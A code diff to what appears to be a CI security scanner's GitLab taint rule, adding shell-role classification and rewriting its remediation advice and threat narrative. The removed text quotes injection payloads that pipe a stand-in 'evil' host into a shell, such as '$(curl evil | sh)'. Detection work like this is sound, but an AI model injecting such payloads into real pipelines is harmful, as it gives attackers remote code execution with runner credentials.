@@ -116,13 +116,30 @@ class TaintPattern:
     # ``"service_image"``, ``"tags"``) are opt-in.  Accepts a single
     # kind or a tuple of kinds.
     sink_kind_filter: str | tuple[str, ...] = "script"
+    # TAINT-GL-001 opts into the private shallow shell-role profile. Other
+    # GitLab taint rules keep their existing quote-filter behavior.
+    role_aware_shallow: bool = False
 
     # CONTRACT: returns (line_num, snippet) where line_num is the
     # taint sink's source line, and snippet is the rendered provenance
     # chain — not literal source text.  Documented exception, see
     # taintly._pattern_contract.
-    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
-        out: list[tuple[int, str]] = []
+    def _selected_paths(
+        self,
+        content: str,
+        lines: list[str],
+        filepath: str = "",
+        *,
+        classify_roles: bool = True,
+    ) -> list[tuple[TaintPath, object | None]]:
+        if self.role_aware_shallow:
+            from .shell_role import (
+                GitLabShellRole,
+                classify_gitlab_shallow_use,
+                is_possible_interpreter_input,
+            )
+
+        out: list[tuple[TaintPath, object | None]] = []
         allowed_sinks = (
             (self.sink_kind_filter,)
             if isinstance(self.sink_kind_filter, str)
@@ -133,6 +150,9 @@ class TaintPattern:
                 continue
             if self.kind_filter is not None and path.kind != self.kind_filter:
                 continue
+            evidence = None
+            if classify_roles and self.role_aware_shallow and path.kind == "shallow":
+                evidence = classify_gitlab_shallow_use(content, filepath, path)
             if self.sink_quote_filter is not None:
                 # Last hop's name is the variable referenced at the sink.
                 # Skip paths whose hop name carries a dotted prefix
@@ -142,11 +162,51 @@ class TaintPattern:
                 var_name = path.hops[-1].name if path.hops else ""
                 if var_name and "." not in var_name:
                     safely_quoted = _sink_is_safely_quoted(path.sink_snippet, var_name)
+                    if (
+                        evidence is not None
+                        and getattr(evidence, "role", None) is GitLabShellRole.CODE
+                    ):
+                        safely_quoted = False
+                    if (
+                        self.role_aware_shallow
+                        and safely_quoted
+                        and is_possible_interpreter_input(path.sink_snippet, var_name)
+                    ):
+                        safely_quoted = False
                     if self.sink_quote_filter == "unsafe_only" and safely_quoted:
                         continue
                     if self.sink_quote_filter == "safely_quoted_only" and not safely_quoted:
                         continue
-            out.append((path.sink_line, _format_chain(path)))
+            out.append((path, evidence))
+        return out
+
+    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
+        return [
+            (path.sink_line, _format_chain(path))
+            for path, _evidence in self._selected_paths(content, lines, classify_roles=False)
+        ]
+
+    def context_notes_for_matches(
+        self, content: str, filepath: str, matches: list[tuple[int, str]]
+    ) -> list[object | None] | None:
+        if not self.role_aware_shallow:
+            return None
+        from collections import Counter
+
+        from .shell_role import GitLabShellEvidence
+
+        selected = self._selected_paths(content, content.splitlines(), filepath)
+        pairs = [(path.sink_line, _format_chain(path)) for path, _ in selected]
+        counts = Counter(pairs)
+        match_counts = Counter(matches)
+        out: list[object | None] = []
+        for match in matches:
+            indexes = [index for index, pair in enumerate(pairs) if pair == match]
+            if len(indexes) != 1 or counts[match] != 1 or match_counts[match] != 1:
+                out.append(None)
+                continue
+            evidence = selected[indexes[0]][1]
+            out.append(evidence if isinstance(evidence, GitLabShellEvidence) else None)
         return out
 
 
@@ -237,57 +297,22 @@ def _find_cross_file_taint_findings(corpus: GitLabWorkflowCorpus) -> GitLabCorpu
 
 
 _TAINT_001_REMEDIATION = (
-    "A GitLab pre-defined CI variable that an external contributor "
-    "controls (commit title / message / branch name, MR title / "
-    "description / source branch) is copied into a project-defined "
-    "``variables:`` entry, and that variable is then expanded inside "
-    "a ``script:``, ``before_script:``, or ``after_script:`` line.  "
-    "The ``variables:`` indirection is NOT a mitigation — at runtime "
-    "the runner's shell expands the value, so an attacker who injects "
-    "shell metacharacters (e.g. ``$(curl evil | sh)``) into the "
-    "commit message or MR title gets command execution with the "
-    "runner's full token and protected variables.\n"
+    "Keep untrusted GitLab CI values as data and review the exact consumer. "
+    "Simple parameter expansion does not recursively parse the expanded value "
+    "as shell syntax, but word splitting, globbing, options, and later consumers "
+    "still require review. Avoid eval and interpreter-code inputs.\n"
     "\n"
-    "  # BAD — variables indirection still gets shell-expanded\n"
+    "  # DATA — fixed format and explicit argument\n"
     "  variables:\n"
     "    PR_TITLE: $CI_MERGE_REQUEST_TITLE\n"
     "  job:\n"
     "    script:\n"
-    '      - echo "$PR_TITLE"\n'
+    "      - printf '%s\\n' \"$PR_TITLE\"\n"
     "\n"
-    "Pick one of these patterns:\n"
-    "\n"
-    "  # GOOD — pipe through stdin / a file so the value never reaches\n"
-    "  # the shell as a substituted token.\n"
-    "  variables:\n"
-    "    PR_TITLE: $CI_MERGE_REQUEST_TITLE\n"
-    "  job:\n"
-    "    script:\n"
-    "      - printenv PR_TITLE > /tmp/title\n"
-    "      - some-tool --title-file /tmp/title\n"
-    "\n"
-    "  # GOOD — sanitize via parameter expansion before use.\n"
-    "  job:\n"
-    "    script:\n"
-    "      - SAFE='${CI_MERGE_REQUEST_TITLE//[^a-zA-Z0-9._ -]/}'\n"
-    '      - echo "$SAFE"\n'
-    "\n"
-    "  # GOOD — gate on the value in a ``rules:`` clause; GitLab\n"
-    "  # evaluates those server-side, no shell involved.\n"
-    "  job:\n"
-    "    rules:\n"
-    "      - if: '$CI_MERGE_REQUEST_TITLE =~ /^\\[release\\]/'\n"
-    "    script:\n"
-    "      - ./release.sh\n"
-    "\n"
-    "Note: GitLab's existing ``SEC4-GL-001`` catches the *direct* "
-    "case where the predefined variable is referenced unquoted in a "
-    "script line.  This rule closes the gap where the value is first "
-    "laundered through a project ``variables:`` entry — even quoted "
-    "use of the indirection variable still expands the attacker's "
-    "string, so quoting alone is not a fix."
+    "Quoting alone does not make eval or interpreter consumption safe. "
+    "Review runner shell configuration, downstream consumers, and any "
+    "credential or protected-variable availability separately."
 )
-
 
 # ---------------------------------------------------------------------------
 # Rules
@@ -297,9 +322,11 @@ _TAINT_001_REMEDIATION = (
 RULES = [
     Rule(
         id="TAINT-GL-001",
+        confidence="medium",
+        review_needed=True,
         title=(
-            "Attacker-controlled CI variable flows through a "
-            "``variables:`` entry into a script (shallow taint)"
+            "Untrusted GitLab CI value flows through a ``variables:`` entry "
+            "into a script (shallow taint; shell role requires review)"
         ),
         severity=Severity.CRITICAL,
         platform=Platform.GITLAB,
@@ -313,25 +340,24 @@ RULES = [
             "``$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME``, ...) is copied into a "
             "project-defined ``variables:`` entry — at top level or "
             "scoped to a single job — and that project variable is "
-            "subsequently expanded inside a ``script:``, "
-            "``before_script:``, or ``after_script:`` line.  "
+            "subsequently referenced inside a ``script:``, "
+            "``before_script:``, or ``after_script:`` line. This identifies "
+            "a source path, not by itself command execution. Under a supported "
+            "conditional POSIX profile, eval or a literal interpreter input can "
+            "make the value code; ordinary parameter expansion does not recursively "
+            "parse the value. Unsupported syntax and ownership remain unknown. "
             "``SEC4-GL-001``'s line-local regex flags only the direct "
             "reference; it cannot see the indirection through "
-            "``variables:`` that many pipelines use, mistakenly "
-            "believing it sanitises the value.  The runner expands "
-            "the indirection at shell time, so an attacker who "
-            "injects shell metacharacters into the source CI "
-            "variable gets command execution with the runner's full "
-            "token and every protected variable in scope."
+            "``variables:`` block. The actual runner shell, trigger execution, "
+            "variable availability, token issuance, and effective permissions "
+            "are not established by this finding."
         ),
         pattern=TaintPattern(
             kind_filter="shallow",
-            # 2026-04-27 audit: only fire on actually-unsafe sinks
-            # (unquoted reference OR eval-class re-parsing). Mirror
-            # of the TAINT-GH-001 fix. Safely-quoted multi-hop / lint
-            # cases are deliberately not tracked on GitLab — see
-            # SCORECARDS notes for the rationale.
+            # Keep quoted ordinary arguments quiet while admitting bounded
+            # interpreter-input candidates for occurrence-level validation.
             sink_quote_filter="unsafe_only",
+            role_aware_shallow=True,
         ),
         remediation=_TAINT_001_REMEDIATION,
         reference="https://docs.gitlab.com/ci/variables/predefined_variables/",
@@ -392,16 +418,12 @@ RULES = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "An external contributor opens an MR whose title is "
-            '``"; curl evil.sh | sh ; #``.  The pipeline copies the '
-            "title into ``PR_TITLE`` via the ``variables:`` block — "
-            "which the author believed was a mitigation — and a later "
-            '``script:`` step evaluates ``echo "$PR_TITLE"``, '
-            "executing the injected command with the runner's full "
-            "GitLab token, protected CI/CD variables, and SSH keys."
+            "A merge-request-controlled value is copied into a project variable and "
+            "reaches a script item. Whether it is ordinary argument data, supported "
+            "shell code, or unresolved syntax depends on the exact command and unique "
+            "source/job/item ownership. Runner configuration and credentials are unverified."
         ),
         incidents=[],
-        confidence="high",
     ),
     Rule(
         id="TAINT-GL-002",
